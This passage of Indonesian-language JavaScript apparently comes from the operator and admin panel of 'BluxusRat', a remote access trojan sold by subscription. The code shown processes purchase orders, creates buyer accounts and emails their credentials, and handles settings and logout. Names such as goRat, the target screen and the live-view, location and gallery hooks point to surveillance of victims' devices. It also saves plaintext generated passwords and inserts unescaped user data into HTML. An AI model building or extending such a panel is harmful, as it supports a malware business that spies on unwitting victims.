      box.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Belum ada log</div>';
      return;
    }
    const logs = Object.entries(snap.val())
      .map(([id, v]) => ({ id, ...v }))
      .sort((a, b) => b.at - a.at)
      .slice(0, 50);
    box.innerHTML = `<div class="console-box">${logs.map(l => `
      <div class="console-line">
        <span class="console-ts">[${fmtTime(l.at)}]</span>
        <span class="console-badge ${l.level || "info"}">${(l.level || "info").toUpperCase()}</span>
        <span class="console-msg">${l.message || ""}</span>
      </div>
    `).join("")}</div>`;
  } catch (e) {
    box.innerHTML = '<div style="color:var(--error);font-size:12px;text-align:center;padding:20px">Gagal load</div>';
  }
}

// ============================================================
// EKONOMI + MANAGE ORDER
// ============================================================
function goEkonomi() {
  showScreen("ekonomi");
}

function goOrder() {
  showScreen("order");
  State.order.tab = "pending";
  State.order.search = "";
  $("#order-search").value = "";
  $$("#order-seg button").forEach(b => b.classList.toggle("active", b.dataset.tab === "pending"));
  loadOrders();
}

async function loadOrders() {
  const list = $("#order-list");
  list.innerHTML = '<div class="skeleton"></div><div class="skeleton"></div>';
  try {
    const snap = await fbGet(fbRef(State.db, "orders"));
    if (!snap.exists()) {
      list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:40px 20px">Belum ada order</div>';
      return;
    }
    const all = Object.entries(snap.val()).map(([id, v]) => ({ id, ...v }));
    let filtered = all.filter(o => o.status === State.order.tab);
    if (State.order.search) {
      filtered = filtered.filter(o => o.orderId.toLowerCase().includes(State.order.search.toLowerCase()));
    }
    filtered.sort((a, b) => b.createdAt - a.createdAt);
    State.order.items = filtered;

    if (!filtered.length) {
      list.innerHTML = `<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:40px 20px">Belum ada order ${State.order.tab}</div>`;
      return;
    }

    list.innerHTML = filtered.map(o => `
      <div class="order-item" data-oid="${o.orderId}">
        <div class="oi-head">
          <div class="oi-id">${o.orderId}</div>
          <div class="oi-status ${o.status}">${o.status}</div>
        </div>
        <div class="oi-info">
          <div class="oi-role">${o.roleLabel} · ${o.durationLabel}</div>
          <div class="oi-price">${fmtPrice(o.price)}</div>
        </div>
        <div style="font-size:11px;color:var(--text-dim);margin-top:8px">
          <div>@${o.username} · ${o.email}</div>
          <div style="margin-top:2px">${timeAgo(o.createdAt)}</div>
        </div>
      </div>
    `).join("");
    $$(".order-item").forEach(el => el.onclick = () => {
      haptic(10);
      openOrderDetail(el.dataset.oid);
    });
  } catch (e) {
    list.innerHTML = '<div style="text-align:center;color:var(--error);font-size:12px;padding:20px">Gagal load</div>';
  }
}

function openOrderDetail(oid) {
  const o = State.order.items.find(x => x.orderId === oid);
  if (!o) return;
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Detail Order</h3>
    <div class="sub">${o.orderId}</div>
    <div class="order-detail">
      <div class="od-row highlight"><span class="l">Status</span><span class="v" style="text-transform:uppercase;color:var(--${o.status === "verified" ? "success" : o.status === "rejected" ? "error" : "warning"})">${o.status}</span></div>
      <div class="od-row"><span class="l">Role</span><span class="v">${o.roleLabel}</span></div>
      <div class="od-row"><span class="l">Durasi</span><span class="v">${o.durationLabel}</span></div>
      <div class="od-row"><span class="l">Harga</span><span class="v">${fmtPrice(o.price)}</span></div>
      <div class="od-row"><span class="l">Username</span><span class="v">${o.username}</span></div>
      <div class="od-row"><span class="l">Email</span><span class="v">${o.email}</span></div>
      <div class="od-row"><span class="l">Dibuat</span><span class="v">${fmtDateTime(o.createdAt)}</span></div>
      ${o.verifiedAt ? `<div class="od-row"><span class="l">Diverifikasi</span><span class="v">${fmtDateTime(o.verifiedAt)}</span></div>` : ""}
      ${o.note ? `<div class="od-row"><span class="l">Catatan</span><span class="v">${o.note}</span></div>` : ""}
    </div>
    ${o.status === "pending" ? `
      <div class="field" style="margin-top:14px">
        <label>Catatan (opsional)</label>
        <textarea id="order-note" placeholder="Alasan reject / catatan verifikasi..."></textarea>
      </div>
      <div class="modal-actions">
        <button class="btn btn-danger" id="btn-reject-order"><i class="fa-solid fa-xmark"></i> Reject</button>
        <button class="btn btn-primary" id="btn-verify-order"><i class="fa-solid fa-check"></i> Verifikasi</button>
      </div>
    ` : `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`}
  `;
  $("#modal").classList.add("show");

  if (o.status === "pending") {
    $("#btn-verify-order").onclick = () => verifyOrder(o);
    $("#btn-reject-order").onclick = () => rejectOrder(o);
  }
}

async function verifyOrder(o) {
  haptic(20);
  if (!confirm(`Verifikasi order ${o.orderId}?\n\nAkun "${o.username}" akan dibuat dengan password random & dikirim ke ${o.email}`)) return;
  const note = $("#order-note")?.value.trim() || "";

  const btnVerify = $("#btn-verify-order");
  if (btnVerify) {
    btnVerify.disabled = true;
    btnVerify.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Memproses...';
  }

  try {
    const usersSnap = await fbGet(fbRef(State.db, "users"));
    const users = usersSnap.exists() ? usersSnap.val() : {};
    for (const uid in users) {
      if (users[uid].username === o.username) {
        return toast("Username sudah dipakai, hubungi user", "err");
      }
    }

    const pw = genPassword(8);
    const salt = genSalt();
    const hash = await sha256(pw + salt);
    const userCode = genUserCode();
    const exp = o.duration === -1 ? null : Date.now() + o.duration * 86400000;

    const newRef = fbPush(fbRef(State.db, "users"));
    await fbSet(newRef, {
      username: o.username,
      passwordHash: hash,
      passwordSalt: salt,
      role: o.role,
      userCode: userCode,
      createdBy: State.uid,
      createdAt: Date.now(),
      expiresAt: exp,
      banned: false,
      avatar: ""
    });

    await fbUpdate(fbRef(State.db, "orders/" + o.orderId), {
      status: "verified",
      verifiedAt: Date.now(),
      verifiedBy: State.uid,
      note: note || "Akun dibuat & email terkirim",
      generatedPassword: pw,
      generatedUserCode: userCode
    });

    toast("Mengirim email ke " + o.email + "...", "info");
    let emailOk = false;
    let emailErr = "";
    try {
      const htmlBody = buildEmailHTML({
        username: o.username,
        password: pw,
        role: o.roleLabel,
        duration: o.durationLabel,
        orderId: o.orderId
      });
      await sendEmail({
        to: o.email,
        subject: `Akun BluxusRat Kamu — ${o.orderId}`,
        htmlBody
      });
      emailOk = true;
      toast("Email terkirim ✓", "ok");
    } catch (e) {
      emailErr = e.message || String(e);
      toast("Email gagal: " + emailErr, "warn", 8000);
    }

    const box = $("#modal-box");
    box.innerHTML = `
      <h3 style="color:var(--success)">Order Diverifikasi ✓</h3>
      <div class="sub">${o.orderId}</div>
      <div class="order-detail">
        <div class="od-row highlight"><span class="l">Username</span><span class="v">${o.username}</span></div>
        <div class="od-row highlight"><span class="l">Password</span><span class="v" style="color:var(--accent-hover)">${pw}</span></div>
        <div class="od-row"><span class="l">User Code</span><span class="v">${userCode}</span></div>
        <div class="od-row"><span class="l">Role</span><span class="v">${o.roleLabel}</span></div>
        <div class="od-row"><span class="l">Durasi</span><span class="v">${o.durationLabel}</span></div>
        <div class="od-row"><span class="l">Email</span><span class="v">${o.email}</span></div>
        <div class="od-row"><span class="l">Status Email</span><span class="v" style="color:var(--${emailOk ? "success" : "error"})">${emailOk ? "Terkirim ✓" : "Gagal ✗"}</span></div>
        ${!emailOk ? `<div class="od-row"><span class="l">Error</span><span class="v" style="color:var(--error);font-size:10px">${emailErr}</span></div>` : ""}
      </div>
      ${!emailOk ? `
      <div class="buy-note" style="margin-top:14px">
        <i class="fa-solid fa-triangle-exclamation" style="color:var(--warning)"></i>
        <span>Email gagal terkirim. Copy detail akun di bawah & kirim manual ke user via WhatsApp.</span>
      </div>` : ""}
      <div class="modal-actions">
        <button class="btn btn-ghost" id="btn-copy-detail"><i class="fa-solid fa-copy"></i> Copy Detail</button>
        <button class="btn btn-primary" onclick="closeModal();loadOrders()">OK</button>
      </div>
    `;
    $("#btn-copy-detail").onclick = async () => {
      haptic(10);
      const text = `BluxusRat Account\n\nUsername: ${o.username}\nPassword: ${pw}\nUser Code: ${userCode}\nRole: ${o.roleLabel}\nDurasi: ${o.durationLabel}\n\nLogin sekarang & ganti password.`;
      const ok = await copyToClipboard(text);
      toast(ok ? "Detail di-copy" : "Gagal copy", ok ? "ok" : "err");
    };
  } catch (e) {
    toast("Gagal verifikasi: " + e.message, "err");
    if (btnVerify) {
      btnVerify.disabled = false;
      btnVerify.innerHTML = '<i class="fa-solid fa-check"></i> Verifikasi';
    }
  }
}

async function rejectOrder(o) {
  haptic(20);
  if (!confirm(`Reject order ${o.orderId}?`)) return;
  const note = $("#order-note")?.value.trim() || "";
  try {
    await fbUpdate(fbRef(State.db, "orders/" + o.orderId), {
      status: "rejected",
      verifiedAt: Date.now(),
      verifiedBy: State.uid,
      note: note || "Ditolak oleh admin"
    });
    toast(`Order ${o.orderId} di-reject`, "ok");
    closeModal();
    loadOrders();
  } catch (e) {
    toast("Gagal reject: " + e.message, "err");
  }
}

// ============================================================
// SETTINGS / LOGOUT
// ============================================================
function openSettings() {
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Settings</h3><div class="sub">Ubah password & foto profil</div>
    <div class="field"><label>Password Lama</label><input type="password" id="set-old"></div>
    <div class="field"><label>Password Baru</label><input type="password" id="set-new"></div>
    <div class="field"><label>Konfirmasi</label><input type="password" id="set-conf"></div>
    <button class="btn btn-primary" id="btn-save-pw"><i class="fa-solid fa-floppy-disk"></i> Save</button>
    <div style="height:10px"></div>
    <button class="btn btn-ghost" id="btn-pick-photo"><i class="fa-solid fa-image"></i> Ganti Foto Profil</button>
    <input type="file" id="file-photo" accept="image/*" class="hidden">
    <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Close</button></div>`;
  $("#modal").classList.add("show");

  $("#btn-save-pw").onclick = async () => {
    haptic(15);
    const o = $("#set-old").value;
    const n = $("#set-new").value;
    const c = $("#set-conf").value;
    if (!o || !n) return toast("Isi semua field", "err");
    if (n !== c) return toast("Konfirmasi gak cocok", "err");
    if (n.length < 6) return toast("Min 6 karakter", "err");
    const oh = await sha256(o + State.user.passwordSalt);
    if (oh !== State.user.passwordHash) return toast("Password lama salah", "err");
    const salt = genSalt();
    const hash = await sha256(n + salt);
    await fbUpdate(fbRef(State.db, "users/" + State.uid), { passwordHash: hash, passwordSalt: salt });
    State.user.passwordHash = hash;
    State.user.passwordSalt = salt;
    toast("Password diubah", "ok");
    closeModal();
  };

  $("#btn-pick-photo").onclick = () => $("#file-photo").click();
  $("#file-photo").onchange = (e) => {
    const f = e.target.files[0];
    if (!f) return;
    if (f.size > 400000) return toast("Foto max 400KB", "err");
    const r = new FileReader();
    r.onload = async (ev) => {
      const b64 = ev.target.result;
      State.user.avatar = b64;
      $("#acc-avatar").src = b64;
      await fbUpdate(fbRef(State.db, "users/" + State.uid), { avatar: b64 });
      toast("Foto profil diubah", "ok");
    };
    r.readAsDataURL(f);
  };
}

function doLogout() {
  haptic(15);
  const box = $("#modal-box");
  box.innerHTML = `
    <h3>Log Out</h3><div class="sub">Yakin mau keluar dari akun ini?</div>
    <div class="modal-actions">
      <button class="btn btn-ghost" onclick="closeModal()">Batal</button>
      <button class="btn btn-primary" id="btn-confirm-logout">Log Out</button>
    </div>`;
  $("#modal").classList.add("show");
  $("#btn-confirm-logout").onclick = () => {
    localStorage.removeItem("bluxus_uid");
    State.user = null;
    State.uid = null;
    if (State.audio) { State.audio.pause(); State.audio = null; }
    if (State.unsubLive) State.unsubLive();
    if (State.unsubLoc) State.unsubLoc();
    if (State.unsubGallery) State.unsubGallery();
    closeModal();
    showScreen("login");
    $("#login-usn").value = "";
    $("#login-pw").value = "";
  };
}

function closeModal() {
  $("#modal").classList.remove("show");
}

// ============================================================
// EVENTS
// ============================================================
function bindEvents() {
  $("#btn-login").onclick = doLogin;
  $("#login-pw").addEventListener("keydown", e => { if (e.key === "Enter") doLogin(); });
  $("#btn-buy-access").onclick = () => { haptic(10); goBuy(); };
  $("#btn-back-buy").onclick = () => { haptic(8); showScreen("login"); };

  $("#btn-buy-next-1").onclick = () => { haptic(10); renderBuyDurations(); setBuyStep(2); };
  $("#btn-buy-back-2").onclick = () => { haptic(8); setBuyStep(1); };
  $("#btn-buy-next-2").onclick = () => { haptic(10); setBuyStep(3); };
  $("#btn-buy-back-3").onclick = () => { haptic(8); setBuyStep(2); };
  $("#buy-username").addEventListener("input", validateBuyData);
  $("#buy-email").addEventListener("input", validateBuyData);
  $("#btn-buy-next-3").onclick = () => { haptic(15); submitOrder(); };
  $("#btn-buy-pay").onclick = () => { haptic(15); bayarOrder(); };
  $("#btn-buy-done").onclick = () => { haptic(8); showScreen("login"); };

  ["", "-rat", "-tools", "-account", "-about", "-panel", "-anime", "-benefit"].forEach(suf => {
    const b = $("#btn-hamburger" + suf);
    if (b) b.onclick = openSidebar;
  });
  $("#sidebar-backdrop").onclick = closeSidebar;
  $$(".sb-item").forEach(el => { el.onclick = () => goPage(el.dataset.page); });

  $("#btn-target-back").onclick = () => { haptic(8); goRat(); };
  $$(".fp-back").forEach(b => {
    b.onclick = () => {
      haptic(8);
      closeAllFeaturePages();
      if (State.unsubLive) State.unsubLive();
      if (State.unsubLoc) State.unsubLoc();
    };
  });

  $("#btn-ekonomi-back").onclick = () => { haptic(8); goPanel(); };
  $("#btn-manage-order").onclick = () => { haptic(10); goOrder(); };
  $("#btn-order-back").onclick = () => { haptic(8); goEkonomi(); };
  $$("#order-seg button").forEach(b => {
    b.onclick = () => {
      haptic(8);
      $$("#order-seg button").forEach(x => x.classList.remove("active"));
      b.classList.add("active");
      State.order.tab = b.dataset.tab;
      loadOrders();
    };
  });
  $("#order-search").addEventListener("input", (e) => {
    clearTimeout(window._ost);
    window._ost = setTimeout(() => {
      State.order.search = e.target.value.trim();
      loadOrders();
    }, 400);
  });

  $("#btn-settings").onclick = () => { haptic(10); openSettings(); };
  $("#btn-logout").onclick = doLogout;
  $("#btn-change-photo").onclick = () => { haptic(10); openSettings(); };

  $("#btn-upgrade-role").onclick = () => {
    haptic(10);
    window.open(`https://wa.me/${CONFIG.WA_ADMIN}?text=${encodeURIComponent("Halo, saya mau upgrade role BluxusRat")}`, "_blank");
  };

  $("#btn-copy-usercode").onclick = async () => {
    haptic(20);
    const code = State.user?.userCode || "";
    if (!code) return toast("User code kosong", "err");
    const ok = await copyToClipboard(code);
    const btn = $("#btn-copy-usercode");
    if (ok) {
      toast("User code di-copy", "ok");
      btn.classList.add("copied");
      btn.innerHTML = '<i class="fa-solid fa-check"></i>';
      setTimeout(() => {
        btn.classList.remove("copied");
        btn.innerHTML = '<i class="fa-solid fa-copy"></i>';
      }, 2000);
    } else {
      toast("Gagal copy", "err");
    }
  };

  $("#modal").addEventListener("click", e => { if (e.target.id === "modal") closeModal(); });

  initPlayer();
  initAnimeEvents();
}

// ============================================================
// INIT
// ============================================================
async function init() {
  bindEvents();
  runLoading();

  setTimeout(async () => {
    try {
      await loadFirebaseSDK();
      watchConnection();
    } catch (e) {
      console.error("Init error:", e);
      $("#loading-text").textContent = "Error: gagal connect";
      return;
    }

    const resumed = await tryResume();
    if (resumed) {
      $("#login-redirect").classList.add("show");
      setTimeout(() => goDashboard(), 700);
    }
  }, 2500);
}

window.addEventListener("DOMContentLoaded", init);
window.closeModal = closeModal;